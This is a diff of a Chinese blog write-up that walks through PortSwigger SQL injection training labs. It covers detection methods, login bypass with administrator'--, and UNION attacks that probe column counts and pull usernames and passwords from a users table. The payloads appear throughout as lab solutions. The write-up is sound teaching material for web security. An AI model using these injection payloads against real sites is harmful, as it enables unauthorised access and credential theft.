@@ -581,14 +581,15 @@
     <content><![CDATA[<span id="more"></span>
 
 
-<h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p><a href="https://mp.weixin.qq.com/s/RTFrPLDiycU0nwZp4baiKQ">SQL 注入就是借助网站上不健全的 SQL 拼接语句，将攻击者自己的 payload 拼接到原有的 SQL 语句中，使其在服务器上执行恶意 SQL 语句，使得攻击者可以对数据库进行网站运营者预料之外的增、删、改、查操作。</a></p>
+<h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p>SQL注入（SQLi）是一个Web安全漏洞，允许攻击者干扰应用程序对其数据库的查询。这可能允许攻击者查看他们通常无法检索的数据。这可能包括属于其他用户的数据，或应用程序可以访问的任何其他数据。在许多情况下，攻击者可以修改或删除此数据，从而导致应用程序的内容或行为发生持久性更改。在某些情况下，攻击者可以升级SQL注入攻击，以危害底层服务器或其他后端基础设施。它还可以使他们执行拒绝服务攻击。</p>
+<p><a href="https://mp.weixin.qq.com/s/RTFrPLDiycU0nwZp4baiKQ">SQL 注入就是借助网站上不健全的 SQL 拼接语句，将攻击者自己的 payload 拼接到原有的 SQL 语句中，使其在服务器上执行恶意 SQL 语句，使得攻击者可以对数据库进行网站运营者预料之外的增、删、改、查操作。</a></p>
 <h2 id="如何检测SQL注入漏洞"><a href="#如何检测SQL注入漏洞" class="headerlink" title="如何检测SQL注入漏洞"></a>如何检测SQL注入漏洞</h2><ul>
 <li>手工SQL注入测试：<ul>
 <li>单双引号：’ “ ，查看是否报错</li>
 <li>算数运算：比如在id&#x3D;2的地方输入id&#x3D;1+1，查看返回数据是否一致，一致说明可能存在注入点</li>
 <li>布尔条件：比如 OR 1&#x3D;1 和 OR 1&#x3D;2 ，比较两个响应是否有差异，如果存在注入点，前者返回的数据通常是比后者多的</li>
 <li>时间延迟：比如 sleep(5)，如果存在注入点，那么携带 payload 的请求，其响应时间应该会比正常的请求慢 5 秒</li>
-<li>带外测试（？）：查看你的带外平台是否收到了对应的数据</li>
+<li>带外测试：查看你的带外平台是否收到了对应的数据</li>
 </ul>
 </li>
 <li>自动化测试：<ul>
@@ -608,29 +609,35 @@
 <li><code>--</code>是SQL注释符，可以注释掉后面的内容</li>
 <li>在使用<code>OR 1=1</code>的时候要小心，如果在update或delete语句中使用，可能会导致数据意外丢失</li>
 </ul>
-<h3 id="🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据"><a href="#🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据" class="headerlink" title="🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据"></a>🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据</h3><h4 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h4><p>本实验在产品类别筛选器中包含一个SQL注入漏洞。当用户选择一个类别时，应用程序执行如下的SQL查询：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>任务：执行SQL注入攻击，使应用程序显示一个或多个未发布的产品</p>
-<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
+<h3 id="🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据"><a href="#🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据" class="headerlink" title="🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据"></a>🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据</h3><ul>
+<li><p>实验说明</p>
+<ul>
+<li>本实验在产品类别筛选器中包含一个SQL注入漏洞。当用户选择一个类别时，应用程序执行如下的SQL查询：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
+<li>任务：执行SQL注入攻击，使应用程序显示一个或多个未发布的产品</li>
+</ul>
+</li>
+<li><p>解题过程</p>
+<ul>
 <li>选择一个类别，然后查看URL中的参数<br><code>filter?category=Accessories</code></li>
 <li>修改URL中的参数，尝试使用<code>&#39;</code>和<code>&quot;</code>，没报错，说明存在注入点</li>
 <li>构造payload：<code>&#39; OR 1=1--</code>，查看返回数据，发现产品数量变多，完成实验✅<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB1-1-%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png"></li>
+</ul>
+</li>
 </ul>
 <h2 id="颠覆应用逻辑"><a href="#颠覆应用逻辑" class="headerlink" title="颠覆应用逻辑"></a>颠覆应用逻辑</h2><ul>
 <li>对于执行以下SQL来检查凭据，如果查询返回用户的详细信息，则登录成功，否则，登录失败<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;wiener&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;bluecheese&#x27;</span></span><br></pre></td></tr></table></figure></li>
 <li>在这种情况下，用户可以以任何身份登录，而无需密码。通过<code>--</code>注释掉密码的判断，即可登录成功。</li>
 <li>例子：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;administrator&#x27;</span><span class="comment">--&#x27; AND password = &#x27;&#x27;</span></span><br><span class="line"># 此查询将返回username为administrator的用户的详细信息，而不需要密码</span><br></pre></td></tr></table></figure></li>
 </ul>
-<h3 id="🧪实验2：允许绕过登录的SQL注入漏洞"><a href="#🧪实验2：允许绕过登录的SQL注入漏洞" class="headerlink" title="🧪实验2：允许绕过登录的SQL注入漏洞"></a>🧪实验2：允许绕过登录的SQL注入漏洞</h3><h4 id="实验说明-1"><a href="#实验说明-1" class="headerlink" title="实验说明"></a>实验说明</h4><ul>
+<h3 id="🧪实验2：允许绕过登录的SQL注入漏洞"><a href="#🧪实验2：允许绕过登录的SQL注入漏洞" class="headerlink" title="🧪实验2：允许绕过登录的SQL注入漏洞"></a>🧪实验2：允许绕过登录的SQL注入漏洞</h3><h4 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h4><ul>
 <li>一个存在SQL注入漏洞的登录表单</li>
 <li>任务：绕过登录，以管理员身份登录</li>
 </ul>
-<h4 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
+<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
 <li>用户名处输入<code>administrator&#39;--</code>，密码随意<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB2-1-payload.png"></li>
 <li>登录成功✅</li>
 </ul>
-<h2 id="SQL注入UNION攻击"><a href="#SQL注入UNION攻击" class="headerlink" title="SQL注入UNION攻击"></a>SQL注入UNION攻击</h2><ul>
+<h2 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h2><ul>
 <li>当应用程序容易受到SQL注入攻击时且查询结果在应用程序的响应中返回时，可以使用<code>UNION</code>关键字从数据库中的其他表中检索数据。这通常被称为SQL注入UNION攻击。</li>
 <li><code>UNION</code>关键字可以执行一个或多个其他<code>SELECT</code>查询，并将结果合并到原始查询的结果中。</li>
 <li>例子：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a,b <span class="keyword">FROM</span> table1 <span class="keyword">UNION</span> <span class="keyword">SELECT</span> c,d <span class="keyword">FROM</span> table2</span><br><span class="line"># 此<span class="keyword">SQL</span>查询返回一个包含两列的结果集，其中包含来自table1的a和b列的数据，以及来自table2的c和d列的数据</span><br></pre></td></tr></table></figure></li>
@@ -645,14 +652,14 @@
 </ul>
 </li>
 </ul>
-<h2 id="确定所需的列数"><a href="#确定所需的列数" class="headerlink" title="确定所需的列数"></a>确定所需的列数</h2><ul>
+<h3 id="确定所需的列数"><a href="#确定所需的列数" class="headerlink" title="确定所需的列数"></a>确定所需的列数</h3><ul>
 <li>在执行SQL注入UNION攻击时，有两种有效的方法可以确定从原始查询返回的列数：<ul>
-<li>使用一系列<code>ORDER BY</code>子句，直到应用程序返回错误<ul>
+<li><strong>使用一系列<code>ORDER BY</code>子句，直到应用程序返回错误</strong><ul>
 <li>例子：  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ORDER BY 1--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; ORDER BY 3--</span></span><br><span class="line"><span class="string">etc.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 这一系列有效负载修改了原始查询，按照结果集中不同列对结果进行排序</span></span><br><span class="line"><span class="string"># `ORDER BY`子句中的列可以由其索引指定，因此不需要知道任何列名</span></span><br><span class="line"><span class="string"># 当指定的列索引超出了结果集中的列数时，应用程序通常会返回错误</span></span><br></pre></td></tr></table></figure></li>
 <li>应用程序可能在HTTP响应中返回数据库错误，也可能返回一般的错误响应，甚至可能不返回任何错误提示。无论哪种方式，只要能够检测到错误，就可以推断出原始查询返回的列数</li>
 </ul>
 </li>
-<li>使用一系列指定不同数量的空值的<code>UNION SELECT</code>语句，直到应用程序不再返回错误<ul>
+<li><strong>使用一系列指定不同数量的空值的<code>UNION SELECT</code>语句，直到应用程序不再返回错误</strong><ul>
 <li>例子：  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT NULL--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; UNION SELECT NULL,NULL--</span></span><br><span class="line"><span class="string">etc.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 如果NULL的数量不匹配，数据库将返回错误</span></span><br><span class="line"><span class="string"># NULL可以为每一种常见的数据类型，因此当列数正确时，能最大限度地提高了有效负载成功的机会</span></span><br></pre></td></tr></table></figure></li>
 <li>与<code>ORDER BY</code>子句一样，应用程序可能在HTTP响应中返回数据库错误，也可能返回一般的错误响应，甚至可能不返回任何错误提示。</li>
 <li>但如果 NULL 值的数量同结果集中列的数量匹配，数据库会在结果集中返回额外的列，其中每一列会包含 NULL 值。对 HTTP 响应的影响取决于应用程序的代码实现。如果够幸运的话，你可以在响应中看到其他内容，例如 HTML 表格的额外行。否则，NULL 值可能触发其他错误，例如 NullPointerException。最坏的情况下，响应可能与由不正确的 NULL 数引起的响应没有区别，使得确定列数的此方法无效。</li>
@@ -661,33 +668,47 @@
 </ul>
 </li>
 </ul>
-<h3 id="🧪实验3：SQL注入UNION攻击，确定查询返回的列数"><a href="#🧪实验3：SQL注入UNION攻击，确定查询返回的列数" class="headerlink" title="🧪实验3：SQL注入UNION攻击，确定查询返回的列数"></a>🧪实验3：SQL注入UNION攻击，确定查询返回的列数</h3><h4 id="实验说明-2"><a href="#实验说明-2" class="headerlink" title="实验说明"></a>实验说明</h4><p>类别删选器中包含一个SQL注入漏洞，查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。这种攻击的第一步时确定查询返回的列数。然后再后续的实验中将使用此技术构建完整的攻击。</p>
-<h4 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
+<h4 id="🧪实验3：SQL注入UNION攻击，确定查询返回的列数"><a href="#🧪实验3：SQL注入UNION攻击，确定查询返回的列数" class="headerlink" title="🧪实验3：SQL注入UNION攻击，确定查询返回的列数"></a>🧪实验3：SQL注入UNION攻击，确定查询返回的列数</h4><ul>
+<li><p>实验说明</p>
+<ul>
+<li>类别删选器中包含一个SQL注入漏洞，查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。这种攻击的第一步时确定查询返回的列数。然后再后续的实验中将使用此技术构建完整的攻击。</li>
+</ul>
+</li>
+<li><p>解题过程</p>
+<ul>
 <li>使用<code>UNION SELECT NULL</code>进行注入，直到不再返回错误：<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB3-1-%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png"></li>
 </ul>
-<h3 id="数据库特定用法"><a href="#数据库特定用法" class="headerlink" title="数据库特定用法"></a>数据库特定用法</h3><ul>
+</li>
+</ul>
+<h4 id="数据库特定用法"><a href="#数据库特定用法" class="headerlink" title="数据库特定用法"></a>数据库特定用法</h4><ul>
 <li>在Oracle上，每个<code>SELECT</code>语句必须包含<code>FROM</code>关键字并指定一个有效的表。</li>
 <li>Oracle上有一个名为<code>DUAL</code>的内置表，因此在Oracle上执行<code>UNION</code>攻击时查询可以是：  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT NULL FROM DUAL--</span></span><br></pre></td></tr></table></figure></li>
 <li>payload使用双破折号<code>--</code>注释掉原始查询的剩余部分。</li>
 <li>在MySQL上，双破折号后的注释符<code>--</code>后必须有一个空格。或者可以使用<code>#</code>作为注释符。</li>
 <li>有关特定数据库的语法，详见<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet"><code>SQL injection cheat sheet</code></a></li>
 </ul>
-<h2 id="查找具有有用数据类型的列"><a href="#查找具有有用数据类型的列" class="headerlink" title="查找具有有用数据类型的列"></a>查找具有有用数据类型的列</h2><ul>
+<h3 id="查找具有有用数据类型的列"><a href="#查找具有有用数据类型的列" class="headerlink" title="查找具有有用数据类型的列"></a>查找具有有用数据类型的列</h3><ul>
 <li>SQL注入UNION攻击能从注入的查询中检索结果。通常想要检索的数据是字符串形式的。这意味着需要在原始查询结果中找到数据类型为字符串数据或与字符串数据兼容的一个或多个列。</li>
 <li>确定所需列的数量后，可以探测每一列以测试它是否可以容纳字符串数据，可以提交一系列的<code>UNION SELECT</code>的payload，依次将字符串数据插入到每一列中。如果列数据类型与字符串数据不兼容，则注入的查询将导致数据库错误。如果没有发生错误，并且应用程序的响应包含一些附加内容（包括注入的字符串值），则相关列适合于检索字符串数据。</li>
 <li>例子：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 首先确定查询返回的列数是<span class="number">4</span>列，然后探测每一列以测试它是否可以容纳字符串数据</span><br><span class="line"><span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL,NULL,NULL--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; UNION SELECT NULL,NULL,&#x27;</span>a<span class="string">&#x27;,NULL--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></li>
 </ul>
-<h3 id="🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列"><a href="#🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列" class="headerlink" title="🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列"></a>🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列</h3><h4 id="实验说明-3"><a href="#实验说明-3" class="headerlink" title="实验说明"></a>实验说明</h4><ul>
+<h4 id="🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列"><a href="#🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列" class="headerlink" title="🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列"></a>🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列</h4><ul>
+<li><p>实验说明</p>
+<ul>
 <li>本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。这种攻击的第一步时确定查询返回的列数。然后识别与字符串数据兼容的列。</li>
 <li>本实验将提供一个随机值，需要使其出现在查询结果中。</li>
 </ul>
-<h4 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
+</li>
+<li><p>解题过程</p>
+<ul>
 <li>首先使用<code>SELECT UNION NULL</code>确定返回的列数，经测试，当有3个<code>NULL</code>时,即<code>?category=Accessories&#39; UNION SELECT NULL,NULL,NULL-- </code>，不再返回错误,因此返回的列数为3<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB4-1-%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0.png"></li>
 <li>然后确认有用的数据类型的列，执行以下payload：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 只有第二个成功，因此第二列是字符串类型</span><br><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL,NULL-- </span></span><br><span class="line"><span class="string">?category=Accessories&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;eDqVcW&#x27;</span>,<span class="keyword">NULL</span><span class="comment">-- </span></span><br><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; UNION SELECT NULL,NULL,&#x27;</span>a<span class="string">&#x27;-- </span></span><br></pre></td></tr></table></figure></li>
 <li>实验要求使用平台提供的随机值，因此将随机值插入到第二列中，即<code>?category=Accessories&#39; UNION SELECT NULL,&#39;eDqVcW&#39;,NULL-- </code><br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB4-2-%E7%A1%AE%E5%AE%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%88%97%EF%BC%88%E4%BD%BF%E7%94%A8%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%8F%90%E4%BE%9B%E7%9A%84%E9%9A%8F%E6%9C%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B5%8B%E8%AF%95%EF%BC%89.png"></li>
 <li>完成实验✅</li>
 </ul>
-<h2 id="使用SQL注入UNION攻击检索感兴趣的数据"><a href="#使用SQL注入UNION攻击检索感兴趣的数据" class="headerlink" title="使用SQL注入UNION攻击检索感兴趣的数据"></a>使用SQL注入UNION攻击检索感兴趣的数据</h2><ul>
+</li>
+</ul>
+<h3 id="检索感兴趣的数据"><a href="#检索感兴趣的数据" class="headerlink" title="检索感兴趣的数据"></a>检索感兴趣的数据</h3><ul>
 <li>当确定了原始查询返回的列数并找到了哪些列可以保存字符串数据时，就可以检索感兴趣的数据了。</li>
 <li>假设：<ul>
 <li>原始查询返回两列，这两列都可以保存字符串数据</li>
@@ -698,29 +719,39 @@
 <li>在这个例子中，可以通过执行以下SQL注入UNION攻击来检索<code>username</code>和<code>password</code>列的数据：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username, password FROM users--</span></span><br></pre></td></tr></table></figure></li>
 <li>为了执行这个攻击，需要<code>users</code>表及列的名称。如果没有，可以猜测表和列的名称。所有现代数据库都提供了检查数据库结构的方法，能够通过这些方法来确定表和列的名称。</li>
 </ul>
-<h3 id="🧪实验5：SQL注入UNION攻击，从其他表中检索数据"><a href="#🧪实验5：SQL注入UNION攻击，从其他表中检索数据" class="headerlink" title="🧪实验5：SQL注入UNION攻击，从其他表中检索数据"></a>🧪实验5：SQL注入UNION攻击，从其他表中检索数据</h3><h4 id="实验说明-4"><a href="#实验说明-4" class="headerlink" title="实验说明"></a>实验说明</h4><ul>
+<h4 id="🧪实验5：SQL注入UNION攻击，从其他表中检索数据"><a href="#🧪实验5：SQL注入UNION攻击，从其他表中检索数据" class="headerlink" title="🧪实验5：SQL注入UNION攻击，从其他表中检索数据"></a>🧪实验5：SQL注入UNION攻击，从其他表中检索数据</h4><ul>
+<li><p>实验说明</p>
+<ul>
 <li>本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。</li>
 <li>数据库中包含一个名为<code>users</code>的表，其中包含<code>username</code>和<code>password</code>列。</li>
 <li>任务：执行SQL注入UNION攻击，检索<code>username</code>和<code>password</code>列的数据，并使用这些信息以<code>administrator</code>的身份登录。</li>
 </ul>
-<h4 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
+</li>
+<li><p>解题过程</p>
+<ul>
 <li>首先确认列数：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; UNION SELECT NULL-- </span></span><br><span class="line"><span class="string">?category=Accessories&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">-- </span></span><br><span class="line"># 成功，说明返回的列数为<span class="number">2</span></span><br></pre></td></tr></table></figure></li>
 <li>然后确定每一列的类型：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL-- </span></span><br><span class="line"><span class="string">?category=Accessories&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span><span class="comment">-- </span></span><br><span class="line"># 两个都成功，说明两列都是字符串类型</span><br></pre></td></tr></table></figure></li>
 <li>使用<code>?category=Accessories&#39; UNION SELECT username, password FROM users</code>进行注入，成功获取<code>username</code>和<code>password</code>列的数据<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB5-1-%E8%8E%B7%E5%BE%97%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81.png"></li>
 <li>使用获得的用户名和密码登录成功</li>
 <li>完成实验✅</li>
 </ul>
-<h2 id="在单个列中检索多个值"><a href="#在单个列中检索多个值" class="headerlink" title="在单个列中检索多个值"></a>在单个列中检索多个值</h2><ul>
+</li>
+</ul>
+<h3 id="在单个列中检索多个值"><a href="#在单个列中检索多个值" class="headerlink" title="在单个列中检索多个值"></a>在单个列中检索多个值</h3><ul>
 <li>在某些情况下，上一个示例中的查询可能只返回单个列。通过将值连接在一起，可以在此单个列中同时检索多个值。可以包含分隔符以区分组合值。</li>
 <li>例子：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username || &#x27;</span><span class="operator">~</span><span class="string">&#x27; || password FROM users--</span></span><br><span class="line"><span class="string"># 在Oracle数据库中，可以使用`||`连接运算符来连接值</span></span><br><span class="line"><span class="string"># 将`username`和`password`连接在一起，并使用`~`作为分隔符，查询的结果包含所有用户名和密码例如：</span></span><br><span class="line"><span class="string"># ···</span></span><br><span class="line"><span class="string"># administrator~s3cure</span></span><br><span class="line"><span class="string"># wiener~peter</span></span><br><span class="line"><span class="string"># ···</span></span><br></pre></td></tr></table></figure></li>
 <li>不同的数据库使用不同的语法来执行字符串连接。详见<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></li>
 </ul>
-<h3 id="🧪实验6：SQL注入UNION攻击，在单个列中检索多个值"><a href="#🧪实验6：SQL注入UNION攻击，在单个列中检索多个值" class="headerlink" title="🧪实验6：SQL注入UNION攻击，在单个列中检索多个值"></a>🧪实验6：SQL注入UNION攻击，在单个列中检索多个值</h3><h4 id="实验说明-5"><a href="#实验说明-5" class="headerlink" title="实验说明"></a>实验说明</h4><ul>
+<h4 id="🧪实验6：SQL注入UNION攻击，在单个列中检索多个值"><a href="#🧪实验6：SQL注入UNION攻击，在单个列中检索多个值" class="headerlink" title="🧪实验6：SQL注入UNION攻击，在单个列中检索多个值"></a>🧪实验6：SQL注入UNION攻击，在单个列中检索多个值</h4><ul>
+<li><p>实验说明</p>
+<ul>
 <li>本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。</li>
 <li>数据库包含一个名为<code>users</code>的表，其中包含<code>username</code>和<code>password</code>列。</li>
 <li>任务：执行SQL注入UNION攻击，检索<code>username</code>和<code>password</code>列的数据，并使用这些信息以<code>administrator</code>的身份登录。</li>
 </ul>
-<h4 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
+</li>
+<li><p>解题过程</p>
+<ul>
 <li>首先确认列数：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Lifestyle<span class="string">&#x27; UNION SELECT NULL-- </span></span><br><span class="line"><span class="string">?category=Lifestyle&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">-- </span></span><br><span class="line"># 成功，说明返回的列数为<span class="number">2</span></span><br></pre></td></tr></table></figure></li>
 <li>然后确认每一列的类型：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Lifestyle<span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL-- </span></span><br><span class="line"><span class="string"># 报错，说明第一列是不是字符串类型</span></span><br><span class="line"><span class="string">?category=Lifestyle&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span><span class="comment">-- </span></span><br><span class="line"># 成功，说明第二列是字符串类型</span><br></pre></td></tr></table></figure></li>
 <li>只有一列是字符串，因此需要在单个列中检索<code>username</code>和<code>password</code>拼接值。</li>
@@ -728,14 +759,16 @@
 <li>查到用户名密码，可以使用administrator登录<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB6-1-%E8%8E%B7%E5%BE%97%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81.png"></li>
 <li>完成实验✅</li>
 </ul>
-<h2 id="检查SQL注入攻击中的数据库"><a href="#检查SQL注入攻击中的数据库" class="headerlink" title="检查SQL注入攻击中的数据库"></a>检查SQL注入攻击中的数据库</h2><ul>
+</li>
+</ul>
+<h3 id="检查SQL注入攻击中的数据库"><a href="#检查SQL注入攻击中的数据库" class="headerlink" title="检查SQL注入攻击中的数据库"></a>检查SQL注入攻击中的数据库</h3><ul>
 <li>要利用SQL注入漏洞，通常需要查找有关数据库的信息，这包括：<ul>
-<li>数据库软件的类型和版本</li>
-<li>数据库包含的表和列</li>
+<li><strong>数据库软件的类型和版本</strong></li>
+<li><strong>数据库包含的表和列</strong></li>
 </ul>
 </li>
 </ul>
-<h3 id="检查数据库的版本和类型"><a href="#检查数据库的版本和类型" class="headerlink" title="检查数据库的版本和类型"></a>检查数据库的版本和类型</h3><p>以下是一些用来确定某些常用数据库类型的数据库版本：</p>
+<h4 id="检查数据库的版本和类型"><a href="#检查数据库的版本和类型" class="headerlink" title="检查数据库的版本和类型"></a>检查数据库的版本和类型</h4><p>以下是一些用来确定某些常用数据库类型的数据库版本：</p>
 <table>
 <thead>
 <tr>
@@ -764,15 +797,21 @@
 </ul>
 </li>
 </ul>
-<h3 id="🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）"><a href="#🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）" class="headerlink" title="🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）"></a>🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）</h3><h4 id="实验说明-6"><a href="#实验说明-6" class="headerlink" title="实验说明"></a>实验说明</h4><ul>
+<h4 id="🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）"><a href="#🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）" class="headerlink" title="🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）"></a>🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）</h4><ul>
+<li><p>实验说明</p>
+<ul>
 <li>本实验在产品类别筛选器中包含一个SQL注入漏洞。可以使用UNION攻击从其他表中检索数据。</li>
 <li>任务：执行SQL注入攻击，确定数据库的类型和版本。</li>
 </ul>
